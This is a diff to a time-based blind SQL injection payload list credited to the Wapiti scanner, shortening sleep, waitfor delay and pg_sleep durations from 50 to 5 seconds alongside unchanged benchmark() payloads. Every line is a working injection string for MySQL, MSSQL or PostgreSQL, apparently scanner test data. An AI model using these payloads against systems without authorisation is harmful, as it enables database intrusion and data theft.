@@ -1,26 +1,26 @@
 
 # from wapiti
-sleep(50)#
-1 or sleep(50)#
-" or sleep(50)#
-' or sleep(50)#
-" or sleep(50)="
-' or sleep(50)='
-1) or sleep(50)#
-") or sleep(50)="
-') or sleep(50)='
-1)) or sleep(50)#
-")) or sleep(50)="
-')) or sleep(50)='
-;waitfor delay '0:0:50'--
-);waitfor delay '0:0:50'--
-';waitfor delay '0:0:50'--
-";waitfor delay '0:0:50'--
-');waitfor delay '0:0:50'--
-");waitfor delay '0:0:50'--
-));waitfor delay '0:0:50'--
-'));waitfor delay '0:0:50'--
-"));waitfor delay '0:0:50'--
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
 benchmark(10000000,MD5(1))#
 1 or benchmark(10000000,MD5(1))#
 " or benchmark(10000000,MD5(1))#
@@ -31,13 +31,13 @@ benchmark(10000000,MD5(1))#
 1)) or benchmark(10000000,MD5(1))#
 ")) or benchmark(10000000,MD5(1))#
 ')) or benchmark(10000000,MD5(1))#
-pg_sleep(50)--
-1 or pg_sleep(50)--
-" or pg_sleep(50)--
-' or pg_sleep(50)--
-1) or pg_sleep(50)--
-") or pg_sleep(50)--
-') or pg_sleep(50)--
-1)) or pg_sleep(50)--
-")) or pg_sleep(50)--
-')) or pg_sleep(50)--
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
